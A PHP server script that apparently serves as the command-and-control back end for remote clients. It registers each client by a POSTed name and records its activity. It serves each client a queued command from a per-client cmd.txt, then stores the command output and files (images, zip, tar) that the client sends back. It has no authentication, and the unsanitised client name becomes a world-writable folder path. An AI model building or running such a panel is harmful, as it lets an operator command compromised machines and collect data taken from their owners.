<?php 
ob_start();
include("timezones.php");
header('Content-Type: application/json', true);
if(isset($_POST['clientuser'])){
    $clientuser=$_POST['clientuser'];
    $clientip=$_SERVER['REMOTE_ADDR'];
    //echo $clientuser." : ".$clientip;
    $clientpath='clients/'.$clientuser;
    if (!file_exists($clientpath)) {
        mkdir($clientpath, 0777, true);
    }
    $myfile = fopen($clientpath."/activity.txt", "w");
    $txt = date5min('Europe/Athens');
    fwrite($myfile, $txt);
    fclose($myfile);
    function createcmdtxt($path,$cmd){
        $myfile = fopen($path, "w");
        $txt = $cmd;
        fwrite($myfile, $txt);
        fclose($myfile);
    }
    if (file_exists($clientpath."/cmd.txt")==false){
        createcmdtxt($clientpath."/cmd.txt","");
    }
    if(!isset($_POST['output'])){
        $clientcmd=file_get_contents($clientpath."/cmd.txt");
        if($clientcmd!=""){
            createcmdtxt($clientpath."/cmd.txt","");
			ob_end_clean();
			echo json_encode($clientcmd);
        }
    }
    if(isset($_POST['output'])){
        $myfile = fopen($clientpath."/output.txt", "w");
        $txt = $_POST['output'];
        fwrite($myfile, $txt);
        fclose($myfile);
    }
    if(isset($_FILES['getfile'])){
        $exterror='Ο τύπος του αρχείου δεν υποστηρίζεται , επιλέχτε αρχεία JPEG ή JPG ή PNG ή GIF .';
        $sizeerror='Το μέγεθος της εικόνας δεν πρέπει να ξεπερνά τα 15 MB !';
        $errors= array();
        if( (isset($_FILES['getfile'])) and ($_FILES['getfile']['name']!='') ){
            $file_name = $_FILES['getfile']['name'];
            $file_size =$_FILES['getfile']['size'];
            $file_tmp =$_FILES['getfile']['tmp_name'];
            $file_type=$_FILES['getfile']['type'];
            $findext=explode('.',$_FILES['getfile']['name']);
            $file_ext=strtolower(end($findext));
            $fname=str_replace($file_ext,"",$_FILES['getfile']['name']).$file_ext;
            $expensions= array("jpeg","jpg","png","gif","zip","tar");
            if(in_array($file_ext,$expensions)=== false){
                $errors[]=$exterror;
            }
            if($file_size > 15728640){
                $errors[]=$sizeerror;
            }
            if(empty($errors)==true){
                $img=$clientpath."/".$fname;
                move_uploaded_file($file_tmp,$img);
                //shell_exec('convert '.$img.' -resize 512x '.$img);
                //shell_exec('convert '.$img.' -quality 50% '.$img);
            }else{
                for($x=0;$x<count($errors);$x++){
                    echo "<p3>".$errors[$x]."</p3><br><br>";
                }
            }
        }
    }
}
?>